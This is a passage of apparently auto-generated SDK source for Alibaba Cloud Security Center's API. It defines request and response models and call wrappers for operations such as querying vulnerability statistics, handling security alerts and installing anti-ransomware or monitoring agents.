    imageList?: [ string ](name='ImageList'),
    namespace?: string(name='Namespace', example='secondary'),
    tagList?: [ string ](name='TagList'),
    targetId?: long(name='TargetId', example='400723'),
    targetName?: string(name='TargetName', example='destination-test-obj-Na3cF'),
    targetType?: string(name='TargetType', example='IMAGE'),
  }(name='RuleTarget'),
}

model GetInterceptionTargetDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetInterceptionTargetDetailResponseBody(name='body'),
}

async function getInterceptionTargetDetailWithOptions(request: GetInterceptionTargetDetailRequest, runtime: Util.RuntimeOptions): GetInterceptionTargetDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.targetId)) {
    query['TargetId'] = request.targetId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetInterceptionTargetDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getInterceptionTargetDetail(request: GetInterceptionTargetDetailRequest): GetInterceptionTargetDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getInterceptionTargetDetailWithOptions(request, runtime);
}

model GetLastOnceTaskInfoRequest {
  source?: string(name='Source', example='console_batch'),
  taskName?: string(name='TaskName', example='ASSETS_COLLECTION'),
  taskType?: string(name='TaskType', example='ASSETS_COLLECTION'),
}

model GetLastOnceTaskInfoResponseBody = {
  collectTime?: long(name='CollectTime', example='1671184531000'),
  finishCount?: int32(name='FinishCount', example='67'),
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
  taskId?: long(name='TaskId', example='3f65e1f1bb13118891a889d569a3****'),
  taskInfo?: {
    progress?: int32(name='Progress', example='69'),
    result?: string(name='Result', example='SUCCESS'),
    status?: string(name='Status', example='SUCCESS'),
  }(name='TaskInfo'),
  totalCount?: int32(name='TotalCount', example='44'),
}

model GetLastOnceTaskInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetLastOnceTaskInfoResponseBody(name='body'),
}

async function getLastOnceTaskInfoWithOptions(request: GetLastOnceTaskInfoRequest, runtime: Util.RuntimeOptions): GetLastOnceTaskInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetLastOnceTaskInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getLastOnceTaskInfo(request: GetLastOnceTaskInfoRequest): GetLastOnceTaskInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return getLastOnceTaskInfoWithOptions(request, runtime);
}

model GetModuleConfigRequest {
  currentPage?: string(name='CurrentPage', example='1'),
  pageSize?: string(name='PageSize', example='10'),
}

model GetModuleConfigResponseBody = {
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  moduleConfigList?: [ 
    {
      configName?: string(name='ConfigName', example='timescan'),
      items?: [ 
        {
          groupId?: int32(name='GroupId', example='5562414'),
          instanceId?: string(name='InstanceId', example='i-uf6435dn4t59b9av****'),
          instanceName?: string(name='InstanceName', example='inStanceName****'),
          ip?: string(name='Ip', example='2.2.X.X'),
          region?: string(name='Region', example='cn-hangzhou'),
          uuid?: string(name='Uuid', example='a47e3713-ed22-4015-93a3-d88ebe6****'),
        }
      ](name='Items'),
      moduleName?: string(name='ModuleName', example='alihids'),
    }
  ](name='ModuleConfigList'),
  pageInfo?: {
    count?: int32(name='Count', example='100'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='100'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='291B49F9-1685-4005-9D34-606B6F78****'),
  success?: boolean(name='Success', example='true'),
}

model GetModuleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetModuleConfigResponseBody(name='body'),
}

async function getModuleConfigWithOptions(request: GetModuleConfigRequest, runtime: Util.RuntimeOptions): GetModuleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetModuleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getModuleConfig(request: GetModuleConfigRequest): GetModuleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getModuleConfigWithOptions(request, runtime);
}

model GetOnceTaskResultInfoRequest {
  taskId?: string(name='TaskId', example='9dfa3a7eb9547781632785b49003****'),
  taskName?: string(name='TaskName', example='ASSETS_COLLECTION'),
  taskType?: string(name='TaskType', example='ASSETS_COLLECTION'),
}

model GetOnceTaskResultInfoResponseBody = {
  collectTime?: long(name='CollectTime', example='1671184531000'),
  finishCount?: int32(name='FinishCount', example='47'),
  requestId?: string(name='RequestId', example='CE500770-42D3-442E-9DDD-156E0F9F****'),
  taskId?: long(name='TaskId', example='e7b70a4b030db086db52231f1b58****'),
  taskInfo?: {
    status?: string(name='Status', example='START'),
  }(name='TaskInfo'),
  totalCount?: int32(name='TotalCount', example='44'),
}

model GetOnceTaskResultInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetOnceTaskResultInfoResponseBody(name='body'),
}

async function getOnceTaskResultInfoWithOptions(request: GetOnceTaskResultInfoRequest, runtime: Util.RuntimeOptions): GetOnceTaskResultInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetOnceTaskResultInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getOnceTaskResultInfo(request: GetOnceTaskResultInfoRequest): GetOnceTaskResultInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return getOnceTaskResultInfoWithOptions(request, runtime);
}

model GetPropertyScheduleConfigRequest {
  type?: string(name='Type', example='scheduler_sca_period'),
  uuid?: string(name='Uuid', example='50d213b4-3a35-427a-b8a5-04b0c7e1****'),
}

model GetPropertyScheduleConfigResponseBody = {
  propertyScheduleConfig?: {
    nextScheduleTime?: long(name='NextScheduleTime', example='1671630647018'),
    scheduleTime?: string(name='ScheduleTime', example='3'),
    type?: string(name='Type', example='scheduler_account_period'),
  }(name='PropertyScheduleConfig'),
  requestId?: string(name='RequestId', example='B37C9052-A73E-4707-A024-92477028****'),
}

model GetPropertyScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetPropertyScheduleConfigResponseBody(name='body'),
}

async function getPropertyScheduleConfigWithOptions(request: GetPropertyScheduleConfigRequest, runtime: Util.RuntimeOptions): GetPropertyScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetPropertyScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getPropertyScheduleConfig(request: GetPropertyScheduleConfigRequest): GetPropertyScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getPropertyScheduleConfigWithOptions(request, runtime);
}

model GetRulesCountResponseBody = {
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
  totalSystemClientRuleCount?: long(name='TotalSystemClientRuleCount', example='10'),
  totalUserDefineRuleCount?: long(name='TotalUserDefineRuleCount', example='10'),
}

model GetRulesCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetRulesCountResponseBody(name='body'),
}

async function getRulesCountWithOptions(runtime: Util.RuntimeOptions): GetRulesCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetRulesCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getRulesCount(): GetRulesCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return getRulesCountWithOptions(runtime);
}

model GetSuspiciousStatisticsRequest {
  groupIdList?: string(name='GroupIdList', description='The ID of the asset group. Separate multiple IDs with commas (,).

>  You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups.', example='9997897'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='10.12.XX.XX'),
}

model GetSuspiciousStatisticsResponseBody = {
  remindCount?: int32(name='RemindCount', description='The number of alerts whose Emergency level is Reminder.', example='0'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='84092B42-1A59-4F34-8DF8-1D93520990A5'),
  seriousCount?: int32(name='SeriousCount', description='The number of alerts whose Emergency level is Urgent.', example='1'),
  suspiciousCount?: int32(name='SuspiciousCount', description='The number of alerts whose Emergency level is Suspicious.', example='8'),
  totalCount?: int32(name='TotalCount', description='The total number of alerts.', example='9'),
}

model GetSuspiciousStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetSuspiciousStatisticsResponseBody(name='body'),
}

async function getSuspiciousStatisticsWithOptions(request: GetSuspiciousStatisticsRequest, runtime: Util.RuntimeOptions): GetSuspiciousStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupIdList)) {
    query['GroupIdList'] = request.groupIdList;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetSuspiciousStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getSuspiciousStatistics(request: GetSuspiciousStatisticsRequest): GetSuspiciousStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getSuspiciousStatisticsWithOptions(request, runtime);
}

model GetVulStatisticsRequest {
  groupIdList?: string(name='GroupIdList', description='The ID of the asset group. Separate multiple IDs with commas (,). 
> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups', example='9997897'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='10.12.XX.XX'),
  typeList?: string(name='TypeList', description='The type of the vulnerability whose statistics you want to query. Separate multiple vulnerability types with commas (,). Valid values:
- **cve**:Linux software vulnerabilities
- **sys**:Windows system vulnerabilities
- **cms**: Web-CMS vulnerabilities
- **emg**: urgent vulnerabilities
- **app**: application vulnerabilities
- **sca**: vulnerabilities that are detected based on software component analysis', example='cve'),
}

model GetVulStatisticsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='3FE272FA-7263-4554-A90F-A7857945A6D5'),
  vulAsapSum?: int32(name='VulAsapSum', description='The number of vulnerabilities that have the high priority.', example='16'),
  vulLaterSum?: int32(name='VulLaterSum', description='The number of vulnerabilities that have the medium priority.', example='0'),
  vulNntfSum?: int32(name='VulNntfSum', description='The number of vulnerabilities that have the low priority.', example='0'),
}

model GetVulStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetVulStatisticsResponseBody(name='body'),
}

async function getVulStatisticsWithOptions(request: GetVulStatisticsRequest, runtime: Util.RuntimeOptions): GetVulStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupIdList)) {
    query['GroupIdList'] = request.groupIdList;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.typeList)) {
    query['TypeList'] = request.typeList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetVulStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getVulStatistics(request: GetVulStatisticsRequest): GetVulStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getVulStatisticsWithOptions(request, runtime);
}

model GetVulWhitelistRequest {
  vulWhitelistId?: long(name='VulWhitelistId', description='The ID of the whitelist.', example='1275'),
}

model GetVulWhitelistResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
  vulWhitelist?: {
    aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2017:3263: curl security update'),
    id?: long(name='Id', description='The ID of the whitelist.', example='1275'),
    name?: string(name='Name', description='The name of the vulnerability.', example='oval:com.redhat.rhsa:def:20173263'),
    reason?: string(name='Reason', description='The reason why the vulnerability is added to the whitelist.', example='Ignore'),
    target?: string(name='Target', description='The application scope of the rule. The value is a JSON string that contains the following fields:

*   **type**: the type of the assets to which the rule is applied. Valid values:

    *   **Uuid**: server
    *   **GroupId**: server group

*   **groupIds**: the IDs of server groups.

*   **uuids**: the UUIDs of servers.

>  If this parameter is empty, the rule is applied to all assets.', example='{
      "type": "GroupId",
      "uuids": [],
      "groupIds": [
            10782678
      ]
}'),
    type?: string(name='Type', description='The type of the vulnerability.', example='cve'),
    whitelist?: string(name='Whitelist', description='The information about the vulnerability that is added to the whitelist. The value is a JSON string that contains the following fields:

*   **Name**: the name of the vulnerability.

*   **Type**: the type of the vulnerability. Valid values:

    *   **cve**: Linux software vulnerability
    *   **sys**: Windows system vulnerability
    *   **cms**: Web-CMS vulnerability
    *   **app**: application vulnerability
    *   **emg**: urgent vulnerability

*   **AliasName**: the alias of the vulnerability.', example='[
      {
            "Name": "oval:com.redhat.rhsa:def:20173263",
            "Type": "cve",
            "AliasName": "RHSA-2017:3263: curl security update"
      }
]'),
  }(name='VulWhitelist', description='The information about the whitelist.'),
}

model GetVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetVulWhitelistResponseBody(name='body'),
}

async function getVulWhitelistWithOptions(request: GetVulWhitelistRequest, runtime: Util.RuntimeOptions): GetVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.vulWhitelistId)) {
    query['VulWhitelistId'] = request.vulWhitelistId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getVulWhitelist(request: GetVulWhitelistRequest): GetVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return getVulWhitelistWithOptions(request, runtime);
}

model HandleSecurityEventsRequest {
  markBatch?: string(name='MarkBatch', description='Specifies whether to add multiple alert events to the whitelist at a time. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  markMissParam?: string(name='MarkMissParam', description='The whitelist rule. The value of this parameter is in the JSON format and contains the following fields:

*   **field**: The field based on which alert events are added to the whitelist.

*   **operate**: The method that is used to added alert events to the whitelist. Valid values:

    *   **notContains**: does not contain
    *   **contains**: contains
    *   **regex**: matches by regular expression
    *   **strEqual**: equals
    *   **strNotEqual**: does not equal

*   **fieldValue**: The value of the field based on which alert events are added to the whitelist.

*   **uuid**: The application scope of the whitelist rule. Valid values:

    *   **part**: the current asset
    *   **ALL**: all assets

>  You can call the [DescribeSecurityEventOperations](~~DescribeSecurityEventOperations~~) operation to obtain the fields that you can specify for **field**.', example='[{"uuid":"part","field":"gmtModified","operate":"contains","fieldValue":"asd"},{"uuid":"part","field":"loginUser","operate":"contains","fieldValue":"vff"}]'),
  operationCode?: string(name='OperationCode', description='The operation that you want to perform to handle the alert events. Valid values:

*   **block_ip**: blocks the source IP address.
*   **advance\\_mark\\_mis_info**: adds the alert events to the whitelist.
*   **ignore**: ignores the alert events.
*   **manual_handled**: marks the alert events as manually handled.
*   **kill_process**: terminates the malicious process.
*   **cleanup**: performs in-depth virus detection and removal.
*   **kill\\_and_quara**: kills the malicious processes and quarantines the source file.
*   **disable\\_malicious_defense**: stops the container on which the alerting files or processes exist.
*   **client\\_problem_check**: performs troubleshooting.
*   **quara**: quarantines the source file of the malicious process.', example='block_ip'),
  operationParams?: string(name='OperationParams', description='The configuration of the operation that you want to perform to handle the alert events.

>  If you set OperationCode to `kill_and_quara` or `block_ip`, you must specify OperationParams. If you set OperationCode to other values, you can leave OperationParams empty.', example='{}'),
  securityEventIds?: [ string ](name='SecurityEventIds', description='The IDs of the alert events.', example='["909361"]'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
}

model HandleSecurityEventsResponseBody = {
  handleSecurityEventsResponse?: {
    taskId?: long(name='TaskId', description='The ID of the task to handle the alert events.', example='15411'),
  }(name='HandleSecurityEventsResponse', description='The handling result of the alert events.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FF0020B9-999F-5DE2-985F-DB282BDA5311'),
}

model HandleSecurityEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: HandleSecurityEventsResponseBody(name='body'),
}

async function handleSecurityEventsWithOptions(request: HandleSecurityEventsRequest, runtime: Util.RuntimeOptions): HandleSecurityEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.markBatch)) {
    query['MarkBatch'] = request.markBatch;
  }
  if (!Util.isUnset(request.markMissParam)) {
    query['MarkMissParam'] = request.markMissParam;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.operationParams)) {
    query['OperationParams'] = request.operationParams;
  }
  if (!Util.isUnset(request.securityEventIds)) {
    query['SecurityEventIds'] = request.securityEventIds;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'HandleSecurityEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function handleSecurityEvents(request: HandleSecurityEventsRequest): HandleSecurityEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return handleSecurityEventsWithOptions(request, runtime);
}

model HandleSimilarSecurityEventsRequest {
  markMissParam?: string(name='MarkMissParam'),
  operationCode?: string(name='OperationCode'),
  operationParams?: string(name='OperationParams'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
  taskId?: long(name='TaskId'),
}

model HandleSimilarSecurityEventsResponseBody = {
  requestId?: string(name='RequestId'),
}

model HandleSimilarSecurityEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: HandleSimilarSecurityEventsResponseBody(name='body'),
}

async function handleSimilarSecurityEventsWithOptions(request: HandleSimilarSecurityEventsRequest, runtime: Util.RuntimeOptions): HandleSimilarSecurityEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.markMissParam)) {
    query['MarkMissParam'] = request.markMissParam;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.operationParams)) {
    query['OperationParams'] = request.operationParams;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'HandleSimilarSecurityEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function handleSimilarSecurityEvents(request: HandleSimilarSecurityEventsRequest): HandleSimilarSecurityEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return handleSimilarSecurityEventsWithOptions(request, runtime);
}

model IgnoreCheckItemsRequest {
  checkAndRiskTypeList?: [ 
    {
      checkId?: long(name='CheckId', example='52'),
      riskType?: string(name='RiskType', example='hc_best_secruity'),
    }
  ](name='CheckAndRiskTypeList'),
  lang?: string(name='Lang', example='zh'),
  reason?: string(name='Reason', example='already config in another way'),
  type?: int32(name='Type', example='1'),
  uuidList?: [ string ](name='UuidList'),
}

model IgnoreCheckItemsResponseBody = {
  requestId?: string(name='RequestId', example='11EBEC99-B4B5-542E-8C17-B87B624C****'),
}

model IgnoreCheckItemsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: IgnoreCheckItemsResponseBody(name='body'),
}

async function ignoreCheckItemsWithOptions(request: IgnoreCheckItemsRequest, runtime: Util.RuntimeOptions): IgnoreCheckItemsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkAndRiskTypeList)) {
    query['CheckAndRiskTypeList'] = request.checkAndRiskTypeList;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'IgnoreCheckItems',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function ignoreCheckItems(request: IgnoreCheckItemsRequest): IgnoreCheckItemsResponse {
  var runtime = new Util.RuntimeOptions{};
  return ignoreCheckItemsWithOptions(request, runtime);
}

model IgnoreHcCheckWarningsRequest {
  checkIds?: string(name='CheckIds', description='The ID of the check item.

>  You can call the [DescribeCheckWarnings](~~DescribeCheckWarnings~~) operation to query the IDs of check items.', example='21313'),
  checkWarningIds?: string(name='CheckWarningIds', description='The ID of the alert that is triggered by the check item. Separate multiple IDs with commas (,).

>  You can call the [DescribeCheckWarnings](~~DescribeCheckWarnings~~) operation to query the IDs of alerts that are triggered by check items.', example='98146905,98146907'),
  reason?: string(name='Reason', description='The reason for the current operation.', example='ignore'),
  riskId?: string(name='RiskId', description='The ID of the risk item that you want to ignore or cancel ignoring.

>  You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs of risk items.', example='51'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  type?: long(name='Type', description='The type of the operation that you want to perform. Valid values:

*   **1**: ignores a risk item
*   **2**: cancels ignoring a risk item', example='1'),
}

model IgnoreHcCheckWarningsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B113119F'),
}

model IgnoreHcCheckWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: IgnoreHcCheckWarningsResponseBody(name='body'),
}

async function ignoreHcCheckWarningsWithOptions(request: IgnoreHcCheckWarningsRequest, runtime: Util.RuntimeOptions): IgnoreHcCheckWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.checkWarningIds)) {
    query['CheckWarningIds'] = request.checkWarningIds;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'IgnoreHcCheckWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function ignoreHcCheckWarnings(request: IgnoreHcCheckWarningsRequest): IgnoreHcCheckWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return ignoreHcCheckWarningsWithOptions(request, runtime);
}

model InstallBackupClientRequest {
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the versions of anti-ransomware policies. Valid values:

*   **1.0.0**
*   **2.0.0**', example='2.0.0'),
  uuid?: string(name='Uuid', description='The UUID of the server on which you want to install the anti-ransomware agent.

>  You must specify at least one of the UuidList and Uuid parameters.', example='inet-617eddab-7df4-4a51-b217-a3f59194****'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of servers on which you want to install the anti-ransomware agent.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='["3bb30859-b3b5-4f28-868f-b0892c98****", "3bb30859-b3b5-4f28-868f-b0892c98****"]'),
}

model InstallBackupClientResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
}

model InstallBackupClientResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallBackupClientResponseBody(name='body'),
}

async function installBackupClientWithOptions(request: InstallBackupClientRequest, runtime: Util.RuntimeOptions): InstallBackupClientResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'InstallBackupClient',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function installBackupClient(request: InstallBackupClientRequest): InstallBackupClientResponse {
  var runtime = new Util.RuntimeOptions{};
  return installBackupClientWithOptions(request, runtime);
}

model InstallCloudMonitorRequest {
  agentAccessKey?: string(name='AgentAccessKey', description='The AccessKey ID that is required to install the CloudMonitor agent. You can call the [DescribeMonitoringAgentAccessKey](~~114948~~) operation to query the AccessKey ID.

>  This parameter is required only when you install the CloudMonitor agent on servers that are not deployed on Alibaba Cloud.', example='usY*****R_U'),
  agentSecretKey?: string(name='AgentSecretKey', description='The AccessKey secret that is required to install the CloudMonitor agent. You can call the [DescribeMonitoringAgentAccessKey](~~114948~~) operation to query the AccessKey secret.

>  This parameter is required only when you install the CloudMonitor agent on servers that are not deployed on Alibaba Cloud.', example='UCxF2R1sIO90XlU9****'),
  argusVersion?: string(name='ArgusVersion', description='The version of the CloudMonitor agent that you want to install on the servers. For more information about the latest version of the CloudMonitor agent, see [Overview](~~183431~~).', example='3.5.6'),
  instanceIdList?: [ string ](name='InstanceIdList', description='The IDs of the servers on which you want to install the CloudMonitor agent. Separate multiple IDs with commas (,).'),
